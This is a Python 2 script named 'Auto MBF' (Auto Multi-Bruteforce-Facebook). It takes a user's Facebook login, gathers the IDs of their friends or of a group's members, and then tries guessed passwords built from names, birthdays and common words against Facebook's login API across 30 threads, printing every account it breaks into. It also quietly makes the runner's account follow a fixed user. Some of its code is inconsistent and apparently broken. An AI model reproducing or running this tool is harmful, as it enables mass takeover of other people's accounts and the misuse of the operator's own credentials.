# coding:utf8

"""
* Jangan Recode Ya Goblok
* Author : V4N654T
* Github : https://github.com/V4N654T
-------------------------------------------------------
* Name Tools : Auto MBF
* Full Name : Auto Multi-Bruteforce-Facebook
* buat : 21 jul 2019 (13.25 = WIB)
* Support : -
* Thanks : All Members (USER PEMULA TERMUX INDONESIA)
                       (       D4RKN35 T34M         )
-------------------------------------------------------
* JANGAN DINAKALIN YA GAN GUA PEMULA KOK
  JADI INTINYA KITA SAMA SAMA BELAJAR :)
"""


import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,zlib,base64
from multiprocessing.pool import ThreadPool
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

back = 0
threads = []
berhasil = []
cekpoint = []
gagal = []
id = []
max = '400'

def keluar():
    print '\033[31;1m[•] Program Finished'
    sys.exit()

def tik():
    animation = '|/-\\'
    for i in range(100):
        time.sleep(0.1)
        sys.stdout.write('\r\033[31;1m[!] \x1b[1;92mTunggu Sebentar \x1b[1;97m' + animation[(i % len(animation))])
        sys.stdout.flush()

logo = """
\033[32;1m        __   _  _  ____   __     __  __  ___  ___
       (  ) ( )( )(_  _) /  \   (  \/  )(  ,)(  _)
       /__\  )()(   )(  ( () )   )    (  ) ,\ ) _)
      (_)(_) \__/  (__)  \__/   (_/\/\_)(___/(_)\033[37;1m  [\033[33;1mv02\033[37;1m]
\033[31;1m========================================================"""



def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[●] \x1b[1;93mSedang masuk \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print "\033[1;96m ============================================================="
print  """\033[1;96m [¤] \x1b[1;93mASSALAMUALAIKUM\x1b[1;96m  \033[1;96m   [¤] \x1b[1;93mWHATSAPP : 085691015635\x1b[1;96m  
\033[1;96m [¤] \x1b[1;93mSELAMAT DATAMG\x1b[1;96m      [¤] \x1b[1;93mFACEBOOK : tools termux\x1b[1;96m  
\033[1;96m [¤] \x1b[1;93mTOOLS MR.BLACK0304\x1b[1;96m  [¤] \x1b[1;93mYOUTUBE  : mr black0304\x1b[1;96m"""
print " \x1b[1;93m============================================================="

CorrectUsername = "rana"
CorrectPassword = "rana"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[☆] \x1b[1;93mUSERNAME TOOLS INI \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[☆] \x1b[1;93mPASSWORD TOOLS INI \x1b[1;96m>>>> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'
        else:
            print "yang bener dong"
            os.system('xdg-open https://wa.me/6285691015635')
    else:
        print "salah sayang!"
        os.system('xdg-open https://wa.me/6285691015635')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		print('\033[1;96m[☆] \x1b[1;93mLOGIN AKUN FACEBOOK ANDA \x1b[1;96m[☆]' )
		id = raw_input('\033[1;96m[+] \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\033[1;96m[✓] \x1b[1;92mLogin Berhasil'
				os.system('xdg-open https://youtube.com/channel/UCkoqlUeR59-foCsaMdQJOJw')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;96m[!] \x1b[1;91mSepertinya akun anda kena checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email salah")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
    global toket
    os.system('reset')
    try:
        toket = open('cookie', 'r').read()
    except IOError:
        print '\x1b[32;1m{!} \x1b[31;1mToken not found'
        os.system('rm -rf cookie')
        time.sleep(1)
        login()

    os.system('reset')
    print logo
    print '\033[37;1m[\033[32;1m01\033[37;1m] \033[33;1mDAFTAR TEMAN'
    print '\033[37;1m[\033[32;1m02\033[37;1m] \033[33;1mDAFTAR GROUP'
    print '\033[37;1m[\033[31;1m00\033[37;1m] \033[31;1mKELUAR'
    print "\033[31;1m========================================================"
    pilih_mbf()

def pilih_mbf():
    global okay
    peak = raw_input("\033[37;1mroot@R15K1\033[31;1m-\033[37;1m#\033[32;1m ")
    if peak == '':
        print '\x1b[31;1m[!] \x1b[31;1mJangan kosong'
        pilih_mbf()
    else:
        if peak == '1' or peak == '01':
            os.system('reset')
            print logo
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        else:
            if peak == '2' or peak == '02':
                os.system('reset')
                print logo
                idg = raw_input('\033[37;1m[\033[32;1m?\033[37;1m] Masukan ID group \033[36;1m:\033[37;1m ')
                try:
                    os.system('reset')
                    print logo
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '\033[31;1m[✓]\033[32;1m Groups\033[31;1m :\033[37;1m ' + asw['name']
                except KeyError:
                    print '\x1b[31;1m[!] \x1b[31;1mGroups Tidak Ditemukan'
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mEnter Aja Gan \x1b[1;91m]')
                    menu()

                re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
                s = json.loads(re.text)
                for i in s['data']:
                    id.append(i['id'])

            else:
                if peak == '0' or peak == '00':
                    os.system('rm -rf cookie')
                    keluar()
                else:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mTidak ada'
                    pilih_mbf()
    print '\033[31;1m[+] \033[32;1mTotal ID\033[31;1m : \033[37;1m'+str(len(id))
    print "\033[36;1m========================================================"

    def main(arg):
        user = arg
        try:
                a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
	        b = json.loads(a.text)
		pass1 = b['first_name'] + '123'
		data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
		q = json.load(data)
		if 'access_token' in q:
		    x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
		    z = json.loads(x.text)
		    print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass1+"\033[36;1m |\033[37;1m "+z['name']
                else:
                    pass2 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                    	x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                        z = json.loads(x.text)
                        print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass2+"\033[36;1m |\033[37;1m "+z['name']
                    else:
                        pass3 = b['last_name'] + '123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                            z = json.loads(x.text)
                            print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass3+"\033[36;1m |\033[37;1m "+z['name']
                        else:
                            lahir = b['birthday']
                            pass4 = lahir.replace('/', '')
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                             	x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                                z = json.loads(x.text)
                                print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass4+"\033[36;1m |\033[37;1m "+z['name']
                            else:
                                pass5 = a['first_name'] + 'ganteng123'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                                    z = json.loads(x.text)
                                    print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass5+"\033[36;1m |\033[37;1m "+z['name']
                                else:
                                    pass6 = a['first_name'] + 'cantik123'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                                        z = json.loads(x.text)
                                        print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass6+"\033[36;1m |\033[37;1m "+z['name']
                                    else:
                                        pass7 = 'doraemon'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                                            z = json.loads(x.text)
                                            print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass7+"\033[36;1m |\033[37;1m "+z['name']
                                        else:
                                            pass8 = 'sayang'
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                                                z = json.loads(x.text)
                                                print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass8+"\033[36;1m |\033[37;1m "+z['name']
                                            else:
                                                pass9 = 'kontol123'
                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                q = json.load(data)
                                                if 'access_token' in q:
                                                    x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                                                    z = json.loads(x.text)
                                                    print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass9+"\033[36;1m |\033[37;1m "+z['name']
        except:
            pass
    meq = ThreadPool(30)
    meq.map(main, id)
    print "\033[31;1m========================================================"
    print "\033[32;1m[✓]\033[37;1m Done Ya Boss Q"
    os.system('rm -rf cookie')
    keluar()



if __name__ == '__main__':
    login()
